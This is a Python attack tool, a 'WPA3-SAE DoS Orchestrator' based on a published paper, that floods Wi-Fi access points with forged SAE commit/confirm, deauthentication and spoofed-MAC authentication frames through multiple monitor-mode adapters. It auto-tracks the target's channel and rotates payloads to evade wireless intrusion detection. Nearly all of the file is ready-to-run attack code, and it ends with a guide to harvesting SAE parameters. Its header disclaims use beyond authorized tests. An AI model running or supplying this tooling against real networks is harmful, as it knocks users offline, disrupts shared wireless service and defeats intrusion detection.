#!/usr/bin/env python3
"""
================================================================================
WPA3-SAE DoS Orchestrator (Scientific Research Edition)
================================================================================
Based on: "How is your Wi-Fi connection today? DoS attacks on WPA3-SAE"
Journal of Information Security and Applications (2022)

FOR EDUCATIONAL PURPOSES AND AUTHORIZED SECURITY TESTS ONLY!
Use only on networks you own or have explicit permission to test.
================================================================================
"""

import subprocess
import time
import os
import sys
import glob
import random
import signal
import re
from multiprocessing import Process, Value, Manager, Lock
from threading import Thread

# =====================================================================================
# ======================== CENTRAL CONFIGURATION ======================================
# =====================================================================================

# --- 1. TARGET DATA ---
# Replace with your target AP's BSSIDs (MAC addresses)
TARGET_BSSID_5GHZ = "AA:BB:CC:DD:EE:11"      # 5 GHz band BSSID
TARGET_BSSID_2_4GHZ = "AA:BB:CC:DD:EE:11"    # 2.4 GHz band BSSID

# --- 2. SAE PARAMETERS (EXTRACTED VIA WIRESHARK) ---
# IMPORTANT: These are CRITICAL for the attack to work!
# Each entry is a tuple: (scalar_hex, finite_element_hex)
# Extract at least 20 valid pairs per band using Wireshark with WRONG passwords.
# Per-packet rotation through this list bypasses WIDS payload-fingerprinting.
# See instructions at the bottom of this file for the extraction guide.

# Parameters for 2.4 GHz Network (List of 20)
SAE_SCALAR_2_4_HEX_LIST =[
    'INSERT_2_4_SCALAR_01_HERE',
    'INSERT_2_4_SCALAR_01_HERE',
    'INSERT_2_4_SCALAR_01_HERE',
    'INSERT_2_4_SCALAR_01_HERE',
    'INSERT_2_4_SCALAR_01_HERE',
    'INSERT_2_4_SCALAR_01_HERE',
    'INSERT_2_4_SCALAR_01_HERE',
    'INSERT_2_4_SCALAR_01_HERE',
    'INSERT_2_4_SCALAR_01_HERE',
    'INSERT_2_4_SCALAR_01_HERE',
    'INSERT_2_4_SCALAR_01_HERE',
    'INSERT_2_4_SCALAR_01_HERE',
    'INSERT_2_4_SCALAR_01_HERE',
    'INSERT_2_4_SCALAR_01_HERE',
    'INSERT_2_4_SCALAR_01_HERE',
    'INSERT_2_4_SCALAR_01_HERE',
    'INSERT_2_4_SCALAR_01_HERE',
    'INSERT_2_4_SCALAR_01_HERE',
    'INSERT_2_4_SCALAR_01_HERE',
    'INSERT_2_4_SCALAR_01_HERE',
]
SAE_FINITE_2_4_HEX_LIST =[
    'INSERT_2_4_FINITE_01_HERE',
    'INSERT_2_4_FINITE_01_HERE',
    'INSERT_2_4_FINITE_01_HERE',
    'INSERT_2_4_FINITE_01_HERE',
    'INSERT_2_4_FINITE_01_HERE',
    'INSERT_2_4_FINITE_01_HERE',
    'INSERT_2_4_FINITE_01_HERE',
    'INSERT_2_4_FINITE_01_HERE',
    'INSERT_2_4_FINITE_01_HERE',
    'INSERT_2_4_FINITE_01_HERE',
    'INSERT_2_4_FINITE_01_HERE',
    'INSERT_2_4_FINITE_01_HERE',
    'INSERT_2_4_FINITE_01_HERE',
    'INSERT_2_4_FINITE_01_HERE',
    'INSERT_2_4_FINITE_01_HERE',
    'INSERT_2_4_FINITE_01_HERE',
    'INSERT_2_4_FINITE_01_HERE',
    'INSERT_2_4_FINITE_01_HERE',
    'INSERT_2_4_FINITE_01_HERE',
    'INSERT_2_4_FINITE_01_HERE',
]

# Parameters for 5 GHz Network (List of 20)
SAE_SCALAR_5_HEX_LIST =[
    'INSERT_5_SCALAR_01_HERE', 'INSERT_5_SCALAR_02_HERE', 'INSERT_5_SCALAR_03_HERE', 'INSERT_5_SCALAR_04_HERE',
    'INSERT_5_SCALAR_05_HERE', 'INSERT_5_SCALAR_06_HERE', 'INSERT_5_SCALAR_07_HERE', 'INSERT_5_SCALAR_08_HERE',
    'INSERT_5_SCALAR_09_HERE', 'INSERT_5_SCALAR_10_HERE', 'INSERT_5_SCALAR_11_HERE', 'INSERT_5_SCALAR_12_HERE',
    'INSERT_5_SCALAR_13_HERE', 'INSERT_5_SCALAR_14_HERE', 'INSERT_5_SCALAR_15_HERE', 'INSERT_5_SCALAR_16_HERE',
    'INSERT_5_SCALAR_17_HERE', 'INSERT_5_SCALAR_18_HERE', 'INSERT_5_SCALAR_19_HERE', 'INSERT_5_SCALAR_20_HERE'
]
SAE_FINITE_5_HEX_LIST =[
    'INSERT_5_FINITE_01_HERE', 'INSERT_5_FINITE_02_HERE', 'INSERT_5_FINITE_03_HERE', 'INSERT_5_FINITE_04_HERE',
    'INSERT_5_FINITE_05_HERE', 'INSERT_5_FINITE_06_HERE', 'INSERT_5_FINITE_07_HERE', 'INSERT_5_FINITE_08_HERE',
    'INSERT_5_FINITE_09_HERE', 'INSERT_5_FINITE_10_HERE', 'INSERT_5_FINITE_11_HERE', 'INSERT_5_FINITE_12_HERE',
    'INSERT_5_FINITE_13_HERE', 'INSERT_5_FINITE_14_HERE', 'INSERT_5_FINITE_15_HERE', 'INSERT_5_FINITE_16_HERE',
    'INSERT_5_FINITE_17_HERE', 'INSERT_5_FINITE_18_HERE', 'INSERT_5_FINITE_19_HERE', 'INSERT_5_FINITE_20_HERE'
]


# --- 3. OPTIONAL SCANNER ---
SCANNER_INTERFACE = ""  # e.g., "wlan2mon" or leave empty for manual channels
SCANNER_INTERVAL = 30   # Seconds between scans
SCANNER_DURATION = 10   # Seconds for each airodump-ng scan

# --- 4. MANUAL CHANNEL ASSIGNMENT (Required without scanner) ---
MANUELLER_KANAL_5GHZ = "36"      # Typical 5 GHz channel
MANUELLER_KANAL_2_4GHZ = "11"     # Typical 2.4 GHz channel

# --- 5. TARGET CLIENTS (For targeted attacks like Deauth-Flood) ---
TARGET_STA_MACS =[
#    "AA:BB:CC:DD:EE:11",
#    "AA:BB:CC:DD:EE:22"
]

# --- 6. AMPLIFICATION REFLECTORS ---
AMPLIFICATION_REFLECTOR_APS_5GHZ =[
    "AA:BB:CC:DD:EE:33", 
    "AA:BB:CC:DD:EE:44", 
    "AA:BB:CC:DD:EE:55",
    "AA:BB:CC:DD:EE:66", 
    "AA:BB:CC:DD:EE:88"  
]
AMPLIFICATION_REFLECTOR_APS_2_4GHZ =[
    "AA:BB:CC:DD:EE:99", 
    "AA:BB:CC:DD:EE:AA", 
    "AA:BB:CC:DD:EE:BB", 
    "AA:BB:CC:DD:EE:CC", 
    "AA:BB:CC:DD:EE:DD"     
]
# ====================== ENCYCLOPEDIA OF ATTACKS ======================
#
# Here you will find a detailed explanation for each available attack type.
# Based on the scientific paper: "How is your Wi-Fi connection today? DoS attacks on WPA3-SAE"
#
# --- Category: Client Direct Attacks ---
#
# "deauth_flood": Classic deauth attack for forcible disconnection.
#
# --- Category: WPA3-Specific Attacks (Modern) ---
#
# "omnivore": Strongest flooding attack with constantly changing MACs.
#     Effect: Floods the router with WPA3 connection attempts from ever-changing, random MAC addresses.
#             This forces the router to reserve memory (RAM) for each attempt until it is full.
#     Most effective band: Both bands (Universal).
#     Suitable for: WPA3 (Very effective). WPA2 APs usually discard the packets without much load.
#
# "muted": Flooding attack with a single, static MAC.
#     Effect: Similar to "omnivore", but all attacks come from the same MAC address. This aims to
#             bypass specific defense mechanisms that only react to attacks from many sources.
#     Most effective band: Both bands (Universal).
#     Suitable for: WPA3.
#
# "hasty": Confusion attack with Commit & Confirm packets.
#     Effect: Sends not only the first step of the WPA3 handshake (Commit) but also immediately the second (Confirm).
#             This aims to confuse the router\'s state machine and generate CPU load.
#     Most effective band: Both bands (Universal).
#     Suitable for: WPA3.
#
# "double_decker": Combines "omnivore" & "muted" for maximum stress.
#     Effect: Described by the authors as "powerful". It attacks the router simultaneously
#             before and after its anti-DoS defense is activated. Maximum memory and CPU load.
#     Most effective band: Both bands (Universal).
#     Suitable for: WPA3.
#
# "cookie_guzzler": Exploits the faulty re-transmission behavior of APs.
#     Effect: Sends SAE Commit frames in "bursts" from random MAC addresses to force the AP to
#             send a disproportionately large number of response frames, thereby overloading itself.
#     Suitable for: WPA3.
#
# --- Category: Universal & Vendor-Specific Attacks ---
#
# "open_auth": Classic DoS attack with Open Authentication requests.
#     Effect: A "Legacy" attack that floods the router with simple, old authentication requests.
#             According to studies, this is particularly effective at overloading the basic CPU queue.
#     Most effective band: 5 GHz (According to study, most effective here).
#     Suitable for: WPA2 and WPA3 (Universally effective). 5 GHz.
#
# "amplification": Spoofs sender MACs of legitimate devices.
#     Effect: The attacker sends packets to the target AP but spoofs the sender MAC address of another
#             device in the network. The target AP responds to the innocent device, clogging the channel.
#     Most effective band: 2.4 GHz (According to study, most effective here as this band is often more crowded).
#     Suitable for: WPA2 and WPA3 (Universally effective, as WPA2 devices also respond with error messages
#                   that clog the channel) 2.4 GHz Band.
#
# "radio_confusion": GENERIC Cross-Band Attack (Broadcom & MediaTek).
#     Effect: Sends SAE frames to the BSSID of the *opposite* band.
#     Mechanism: - If you start the attack on the 2.4 GHz band, the 5 GHz network is targeted/crashed.
#                - If you start the attack on the 5 GHz band, the 2.4 GHz network is targeted/crashed.
#     Why generic? This script automatically detects the adapter\'s band and targets the opposite one.
#                  It covers specific vendor vulnerabilities described in the paper:
#                  - Case 6 (Broadcom) & Case 13 Reverse (MediaTek) -> Attack from 2.4GHz to crash 5GHz.
#                  - Case 6 Reverse (Broadcom) & Case 13 (MediaTek) -> Attack from 5GHz to crash 2.4GHz.
#     Note: In the \'Master\' script, these are split into specific cases. Here, one logic rules them all.
#
# "back_to_the_future": Overloads the memory of a WPA2 AP with WPA3 packets.
#     Effect: Exploits a bug in some WPA2 APs that react incorrectly to WPA3 packets. The attack floods
#             the WPA2 AP with these packets to fill its memory and cause it to crash.
#     Most effective band: Both bands (Universal, targets WPA2 APs).
#     Suitable for: WPA2 (Specifically targets WPA2 APs).
#
# ==============================================================================================
# ======================== ADAPTER CONFIGURATION ======================================
ADAPTER_KONFIGURATION = {
    # --- 5 GHz Band ---
    # "wlan2mon": {"band": "5GHz", "angriff": "amplification"},
    
    # --- 2.4 GHz Band ---
    # "wlan1mon": {"band": "2.4GHz", "angriff": "amplification"},
    "wlan1mon": {"band": "2.4GHz", "angriff": "double_decker"},
    "wlan0mon": {"band": "2.4GHz", "angriff": "double_decker"}
}

# ==============================================================================================
# ================= SCIENTIFIC CONFIGURATION (From the Study) =================
# ==============================================================================================

# Anti-Clogging Thresholds (Table 2 in the paper)
ANTI_CLOGGING_THRESHOLD = 5        # dot11RSNASAEAntiCloggingThreshold (default for most APs)
RETRANS_PERIOD_MS = 40             # dot11RSNASAERetransPeriod (40ms for most APs)
SAE_SYNC = 5                       # dot11RSNASAESync (max retransmissions)
AP_MAX_INACTIVITY = 300            # AP_MAX_INACTIVITY timeout in seconds (300s for most APs)

# Scientific attack parameters (From methodology section)
BURST_SIZE = 128                   # Study uses 128-frame bursts (page 5)
GROUP_ID = 19                      # ECC Group 19 (256-bit) - Only mandatory group

# PMF SA Query Timeouts (Section 5 of the paper)
SA_QUERY_MAX_TIMEOUT = 1.0         # 1000ms maximum wait for SA Query response
SA_QUERY_RETRY_TIMEOUT = 0.201     # 201ms retry timeout

# ======================== SHARED MEMORY FOR SCANNER =================================
shared_channels = Manager().dict({
    '2.4GHz': MANUELLER_KANAL_2_4GHZ,
    '5GHz': MANUELLER_KANAL_5GHZ
})
channel_lock = Lock()

# ======================== SCANNER FUNCTIONS =========================================
def parse_airodump_csv(csv_file):
    results = {}
    try:
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        sections = content.split('\n\n')
        
        if len(sections) >= 1:
            ap_section = sections[0]
            lines = ap_section.strip().split('\n')
            
            for line in lines:
                if 'BSSID' in line or line.startswith('#') or not line.strip():
                    continue
                
                parts = line.split(',')
                if len(parts) >= 14:
                    bssid = parts[0].strip()
                    channel = parts[3].strip()
                    
                    if not channel or not channel.isdigit():
                        continue
                    
                    if bssid.upper() == TARGET_BSSID_2_4GHZ.upper():
                        results['2.4GHz'] = channel
                    elif bssid.upper() == TARGET_BSSID_5GHZ.upper():
                        results['5GHz'] = channel
        return results
    except Exception as e:
        print(f"[SCANNER PARSE ERROR] {e}")
        return {}

def scanner_process(scanner_iface, interval, scan_duration, shared_dict, lock):
    if not scanner_iface:
        print("[SCANNER] Scanner disabled (no interface specified)")
        return
    
    print(f"[SCANNER] Starting on {scanner_iface} (Interval: {interval}s, Scan: {scan_duration}s)")
    
    for f in glob.glob("/tmp/scan_*"):
        try: os.remove(f)
        except: pass
    
    while True:
        try:
            timestamp = int(time.time())
            prefix = f"/tmp/scan_{timestamp}"
            
            cmd =[
                'airodump-ng', '--write', prefix, '--output-format', 'csv',
                '--band', 'abg', '--write-interval', '2', scanner_iface
            ]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(scan_duration)
            
            if proc.poll() is None:
                proc.terminate()
                proc.wait(timeout=2)
            
            csv_files = glob.glob(f"{prefix}-*.csv")
            if csv_files:
                latest_csv = max(csv_files, key=os.path.getctime)
                found_channels = parse_airodump_csv(latest_csv)
                
                with lock:
                    if found_channels.get('2.4GHz'):
                        old_channel = shared_dict.get('2.4GHz')
                        new_channel = found_channels['2.4GHz']
                        if old_channel != new_channel:
                            shared_dict['2.4GHz'] = new_channel
                            print(f"\n[SCANNER] 2.4 GHz: Channel {old_channel} → {new_channel}")
                    
                    if found_channels.get('5GHz'):
                        old_channel = shared_dict.get('5GHz')
                        new_channel = found_channels['5GHz']
                        if old_channel != new_channel:
                            shared_dict['5GHz'] = new_channel
                            print(f"\n[SCANNER] 5 GHz: Channel {old_channel} → {new_channel}")
            
            for f in glob.glob(f"{prefix}*"):
                try: os.remove(f)
                except: pass
            
            with lock:
                print(f"\r[SCANNER] Current: 2.4G={shared_dict.get('2.4GHz')}, 5G={shared_dict.get('5GHz')}", end="")
                sys.stdout.flush()
            
            time.sleep(max(0, interval - scan_duration))
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"\n[SCANNER ERROR] {e}")
            time.sleep(5)

# ======================== ATTACK FUNCTIONS ==========================================
def run_attacker_process(interface, bssid, channel, attack_type, scalar_hex_list, finite_hex_list, 
                         counter, sta_macs=None, amplification_targets=None, opposite_bssid=None):
    """
    Scientific attack implementation based on the research paper.
    Dynamically cycles through list_of_20_scalars to mimic real varied connections.
    """
    from scapy.all import RandMAC, Dot11, RadioTap, Dot11Auth, Dot11Deauth, sendp
    
    try:
        subprocess.run(['iwconfig', interface, 'channel', str(channel)], 
                      check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"[ATTACK] {interface} on channel {channel} -> {attack_type}")
    except Exception as e:
        print(f"[ERROR] {interface}: Failed to set channel {channel}: {e}")
        return

    # 2. Decode List of SAE parameters
    try:
        SAE_SCALAR_BYTES_LIST =[bytes.fromhex(s.strip()) for s in scalar_hex_list if "INSERT" not in s]
        SAE_FINITE_BYTES_LIST =[bytes.fromhex(f.strip()) for f in finite_hex_list if "INSERT" not in f]
        
        if not SAE_SCALAR_BYTES_LIST or not SAE_FINITE_BYTES_LIST:
            raise ValueError("SAE Parameter lists contain placeholders or are empty.")
    except Exception as e:
        print(f"[ERROR] {interface}: Hex decoding failed. Ensure 20 payloads are properly extracted: {e}")
        return
        
    def get_random_sae_params():
        """Pulls a random pair of scalar and finite from our lists of 20"""
        max_idx = min(len(SAE_SCALAR_BYTES_LIST), len(SAE_FINITE_BYTES_LIST)) - 1
        idx = random.randint(0, max_idx)
        return SAE_SCALAR_BYTES_LIST[idx], SAE_FINITE_BYTES_LIST[idx]
    
    target_bssid_frame = opposite_bssid if attack_type == "radio_confusion" else bssid
    
    # 3. SCIENTIFIC ATTACK IMPLEMENTATIONS
    try:
        while True:
            packet_list =[]
            
            # === A. DEAUTH FLOOD (Classic attack) ===
            if attack_type == "deauth_flood":
                targets = (sta_macs or []) +["ff:ff:ff:ff:ff:ff"]
                for sta in targets:
                    pkt = RadioTap()/Dot11(addr1=sta, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
                    packet_list.extend([pkt] * 10)
            
            # === B. MEMORY OMNIVORE (Study section 4.4) ===
            elif attack_type == "omnivore":
                unique_macs =[str(RandMAC()) for _ in range(ANTI_CLOGGING_THRESHOLD - 1)]
                for mac_use in unique_macs:
                    curr_scalar, curr_finite = get_random_sae_params()
                    pkt = (RadioTap()/Dot11(type=0, subtype=11, addr1=target_bssid_frame, 
                                           addr2=mac_use, addr3=target_bssid_frame)/
                           Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/curr_scalar/curr_finite)
                    packet_list.append(pkt)
            
            # === C. MUTED ATTACK (Static MAC) ===
            elif attack_type == "muted":
                curr_scalar, curr_finite = get_random_sae_params()
                fixed_mac = sta_macs[0] if sta_macs else "00:11:22:33:44:55"
                pkt = (RadioTap()/Dot11(type=0, subtype=11, addr1=target_bssid_frame, 
                                       addr2=fixed_mac, addr3=target_bssid_frame)/
                       Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/curr_scalar/curr_finite)
                packet_list = [pkt] * BURST_SIZE
            
            # === D. HASTY PEER (Study section 4.2.2) ===
            elif attack_type == "hasty":
                for _ in range(BURST_SIZE // 2):
                    mac_use = str(RandMAC())
                    curr_scalar, curr_finite = get_random_sae_params()
                    
                    commit_pkt = (RadioTap()/Dot11(type=0, subtype=11, addr1=target_bssid_frame, 
                                                  addr2=mac_use, addr3=target_bssid_frame)/
                                 Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/curr_scalar/curr_finite)
                    packet_list.append(commit_pkt)
                    
                    confirm_pkt = (RadioTap()/Dot11(type=0, subtype=11, addr1=target_bssid_frame, 
                                                   addr2=mac_use, addr3=target_bssid_frame)/
                                  Dot11Auth(algo=3, seqnum=2, status=0)/b'\x00\x00'/
                                  bytes([random.randint(0,255) for _ in range(32)]))
                    packet_list.append(confirm_pkt)
            
            # === E. DOUBLE-DECKER (Study section 4.5) ===
            elif attack_type == "double_decker":
                for _ in range(64):
                    curr_scalar, curr_finite = get_random_sae_params()
                    pkt = (RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, 
                                           addr2=str(RandMAC()), addr3=bssid)/
                           Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/curr_scalar/curr_finite)
                    packet_list.append(pkt)
                
                curr_scalar, curr_finite = get_random_sae_params()
                fixed_mac = sta_macs[0] if sta_macs else "00:11:22:33:44:55"
                pkt_fixed = (RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, 
                                             addr2=fixed_mac, addr3=bssid)/
                             Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/curr_scalar/curr_finite)
                packet_list.extend([pkt_fixed] * 64)
            
            # === F. COOKIE GUZZLER (Study section 4.2.1) ===
            elif attack_type == "cookie_guzzler":
                static_mac = str(RandMAC())
                curr_scalar, curr_finite = get_random_sae_params()
                for _ in range(BURST_SIZE):
                    pkt = (RadioTap()/Dot11(type=0, subtype=11, addr1=target_bssid_frame, 
                                           addr2=static_mac, addr3=target_bssid_frame)/
                           Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/curr_scalar/curr_finite)
                    packet_list.append(pkt)
            
            # === G. AMPLIFICATION ATTACK (Study section 4.6) ===
            elif attack_type == "amplification":
                if amplification_targets and len(amplification_targets) >= 2:
                    curr_scalar, curr_finite = get_random_sae_params()
                    src, dst = random.sample(amplification_targets, 2)
                    pkt = (RadioTap()/Dot11(type=0, subtype=11, addr1=dst, addr2=src, addr3=dst)/
                           Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/curr_scalar/curr_finite)
                    packet_list = [pkt] * 50
            
            # === H. OPEN AUTHENTICATION (Study section 4.7) ===
            elif attack_type == "open_auth":
                for _ in range(BURST_SIZE):
                    pkt = (RadioTap()/Dot11(type=0, subtype=11, addr1=target_bssid_frame, 
                                           addr2=str(RandMAC()), addr3=target_bssid_frame)/
                           Dot11Auth(algo=0, seqnum=1, status=0))
                    packet_list.append(pkt)
            
            # === I. RADIO CONFUSION (Study Case VI) ===
            elif attack_type == "radio_confusion":
                for _ in range(BURST_SIZE):
                    curr_scalar, curr_finite = get_random_sae_params()
                    pkt = (RadioTap()/Dot11(type=0, subtype=11, addr1=target_bssid_frame, 
                                           addr2=str(RandMAC()), addr3=target_bssid_frame)/
                           Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/curr_scalar/curr_finite)
                    packet_list.append(pkt)
            
            # === J. BACK TO THE FUTURE (Study Case VII) ===
            elif attack_type == "back_to_the_future":
                for _ in range(128):
                    curr_scalar, curr_finite = get_random_sae_params()
                    pkt = (RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, 
                                           addr2=str(RandMAC()), addr3=bssid)/
                           Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/curr_scalar/curr_finite)
                    packet_list.append(pkt)
            
            # === DEFAULT: Generic SAE Attack ===
            else:
                for _ in range(BURST_SIZE):
                    curr_scalar, curr_finite = get_random_sae_params()
                    pkt = (RadioTap()/Dot11(type=0, subtype=11, addr1=target_bssid_frame, 
                                           addr2=str(RandMAC()), addr3=target_bssid_frame)/
                           Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/curr_scalar/curr_finite)
                    packet_list.append(pkt)
            
            # === SEND PACKETS ===
            if packet_list:
                try:
                    sendp(packet_list, count=1, inter=0, iface=interface, verbose=0)
                    with counter.get_lock():
                        counter.value += len(packet_list)
                    
                    if attack_type in ["omnivore", "double_decker"]:
                        time.sleep(0.02)
                    else:
                        time.sleep(0.01)
                    
                except OSError:
                    time.sleep(0.1)
                except Exception as e:
                    print(f"[SEND ERROR] {interface}: {e}")
                    time.sleep(0.1)
    
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"[CRASH] {interface}: {e}")

# ======================== CLEANUP FUNCTION ==========================================
def cleanup(procs, scanner_proc=None):
    print("\n[INFO] Terminating processes...")
    for interface, proc in procs.items():
        if proc and proc.is_alive():
            proc.terminate()
            proc.join(timeout=1)
            if proc.is_alive():
                proc.kill()
            print(f"[CLEANUP] {interface} terminated")
    if scanner_proc and scanner_proc.is_alive():
        scanner_proc.terminate()
        scanner_proc.join(timeout=1)
        if scanner_proc.is_alive():
            scanner_proc.kill()
        print("[CLEANUP] Scanner terminated")

def signal_handler(sig, frame):
    print("\n[INFO] Received interrupt signal, shutting down...")
    sys.exit(0)

# ======================== MAIN ORCHESTRATOR =========================================
def main():
    if os.geteuid() != 0:
        sys.exit("[ERROR] Must be run as root! Use: sudo python3 script.py")
    
    print("\n" + "="*70)
    print("WPA3-SAE DoS Orchestrator (Scientific Research Edition)")
    print("Based on: 'How is your Wi-Fi connection today? DoS attacks on WPA3-SAE'")
    print("="*70)
    print("\n[INFO] Starting orchestrator with", len(ADAPTER_KONFIGURATION), "adapter(s)")
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    scanner_proc = None
    if SCANNER_INTERFACE:
        scanner_proc = Process(target=scanner_process, 
                              args=(SCANNER_INTERFACE, SCANNER_INTERVAL, SCANNER_DURATION,
                                    shared_channels, channel_lock))
        scanner_proc.daemon = True
        scanner_proc.start()
        print(f"[SCANNER] Started on {SCANNER_INTERFACE}")
        time.sleep(3)
    else:
        print("[SCANNER] Disabled - using manual channels")
    
    procs = {}
    counters = {iface: Value('L', 0) for iface in ADAPTER_KONFIGURATION}
    active_channels = {}
    
    try:
        while True:
            for interface, config in ADAPTER_KONFIGURATION.items():
                band = config['band']
                attack = config['angriff']
                
                with channel_lock:
                    target_channel = shared_channels.get(band)
                    if not target_channel:
                        target_channel = MANUELLER_KANAL_5GHZ if band == '5GHz' else MANUELLER_KANAL_2_4GHZ
                
                restart_needed = False
                reason = ""
                
                if interface not in procs or not procs[interface].is_alive():
                    restart_needed = True
                    reason = "Process not running"
                elif active_channels.get(interface) != target_channel:
                    restart_needed = True
                    reason = f"Channel change {active_channels.get(interface)} → {target_channel}"
                
                if restart_needed:
                    if interface in procs and procs[interface].is_alive():
                        procs[interface].terminate()
                        procs[interface].join(timeout=0.5)
                        if procs[interface].is_alive():
                            procs[interface].kill()
                    
                    if attack == "radio_confusion":
                        target_band_logic = '5GHz' if band == '2.4GHz' else '2.4GHz'
                        opposite_bssid = TARGET_BSSID_2_4GHZ if band == '5GHz' else TARGET_BSSID_5GHZ
                    else:
                        target_band_logic = band
                        opposite_bssid = None
                    
                    # Passing List of Configs instead of single variables
                    if target_band_logic == '5GHz':
                        s_hex_list, f_hex_list = SAE_SCALAR_5_HEX_LIST, SAE_FINITE_5_HEX_LIST
                        target_bssid = TARGET_BSSID_5GHZ
                        reflectors = AMPLIFICATION_REFLECTOR_APS_5GHZ
                    else:
                        s_hex_list, f_hex_list = SAE_SCALAR_2_4_HEX_LIST, SAE_FINITE_2_4_HEX_LIST
                        target_bssid = TARGET_BSSID_2_4GHZ
                        reflectors = AMPLIFICATION_REFLECTOR_APS_2_4GHZ
                    
                    p = Process(target=run_attacker_process,
                                args=(interface, target_bssid, target_channel, attack, 
                                      s_hex_list, f_hex_list, counters[interface]),
                                kwargs={'sta_macs': TARGET_STA_MACS,
                                        'amplification_targets': reflectors,
                                        'opposite_bssid': opposite_bssid})
                    p.daemon = True
                    procs[interface] = p
                    active_channels[interface] = target_channel
                    p.start()
                    
                    print(f"\n[ORCHESTRATOR] {interface} started: {attack} on channel {target_channel} ({reason})")
            
            with channel_lock:
                channel_status = f"2.4G={shared_channels.get('2.4GHz')}, 5G={shared_channels.get('5GHz')}"
            
            attack_status = " | ".join([f"{iface}:{counters[iface].value}" for iface in ADAPTER_KONFIGURATION])
            sys.stdout.write(f"\r[STATUS] {channel_status} | {attack_status}   ")
            sys.stdout.flush()
            
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\n[INFO] Keyboard interrupt received")
    except Exception as e:
        print(f"\n[ERROR] Unexpected error: {e}")
    finally:
        cleanup(procs, scanner_proc)
        print("[ORCHESTRATOR] Shutdown complete")

def show_extraction_guide():
    print("\n" + "="*70)
    print("SAE PARAMETER EXTRACTION GUIDE (CRITICAL FOR ATTACK TO WORK)")
    print("="*70)
    print("""
1. PUT WIFI ADAPTER IN MONITOR MODE:
   sudo airmon-ng start wlan0

2. START WIRESHARK AND CAPTURE TRAFFIC:
   sudo wireshark
   - Select monitor interface (e.g., wlan0mon)
   - Start capturing

3. PROVOKE A WPA3 HANDSHAKE WITH WRONG PASSWORD:
   - Connect a legitimate device (phone/laptop) to the target WPA3 network
   - Use the WRONG password (this is essential!)

4. FILTER PACKETS IN WIRESHARK:
   - Stop capturing after the failed connection attempt
   - Apply display filter: wlan.fc.type_subtype == 0x0b

5. FIND AND ANALYZE THE COMMIT PACKET:
   - Extract "Scalar" and "Finite Field Element"

6. REPEAT 20 TIMES FOR BOTH BANDS:
   - You need a list of 20 elements per band to mimic 'list_of_20_scalars' 
     from the research paper!
   - Use 20 DIFFERENT wrong passwords to get unique PWE/Scalars!
   - Paste them into the List Configuration.
""")

if __name__ == "__main__":
    # 1. Listen für 2,4 GHz und 5 GHz getrennt zusammenfassen
    list_2_4 = SAE_SCALAR_2_4_HEX_LIST + SAE_FINITE_2_4_HEX_LIST
    list_5 = SAE_SCALAR_5_HEX_LIST + SAE_FINITE_5_HEX_LIST
    
    # 2. Prüfen, ob noch "INSERT_" in der jeweiligen Liste steht
    missing_2_4 = any("INSERT_" in s for s in list_2_4)
    missing_5 = any("INSERT_" in s for s in list_5)
    
    # 3. Abbruch NUR, wenn BEIDE Bänder noch Platzhalter haben
    if missing_2_4 and missing_5:
        print("\n[ERROR] SAE parameters are not fully configured!")
        print("You MUST extract 20 SAE parameter pairs for at least ONE band before using this script.")
        show_extraction_guide()
        sys.exit(1)

    # Check if MAC addresses are still placeholder
    if (TARGET_BSSID_5GHZ == "AA:BB:CC:DD:EE:11" or
        TARGET_BSSID_2_4GHZ == "AA:BB:CC:DD:EE:11"):

        print("\n[WARNING] Target BSSIDs are still placeholder values!")
        print("Please replace AA:BB:CC:DD:EE:11 with your actual target AP MAC addresses.")
        print("Continue anyway? (y/n): ", end="")
        if input().lower() != 'y':
            sys.exit(1)

    main()
